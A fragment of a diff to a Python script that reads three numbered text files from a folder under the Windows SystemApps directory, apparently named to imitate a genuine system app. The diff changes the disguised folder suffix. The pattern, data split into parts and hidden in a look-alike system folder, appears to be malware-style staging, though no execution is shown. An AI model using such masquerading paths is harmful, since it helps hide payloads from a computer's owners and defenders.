@@ -26,9 +26,9 @@ def get_data_from_file(file_path):
         return content
     else:
         return "Error"
-part1_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdV1','w5n1h2txyewy1.txt')
-part2_Data = os.path.join(os.environ['SystemRoot'], 'SystemApps','Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdV1' ,'w5n1h2txyewy2.txt')
-part3_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdV1','w5n1h2txyewy3.txt')
+part1_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx','w5n1h2txyewy1.txt')
+part2_Data = os.path.join(os.environ['SystemRoot'], 'SystemApps','Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx' ,'w5n1h2txyewy2.txt')
+part3_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx','w5n1h2txyewy3.txt')
 content1 = get_data_from_file(part1_data)
 content2 = get_data_from_file(part2_Data)
 content3 = get_data_from_file(part3_data)
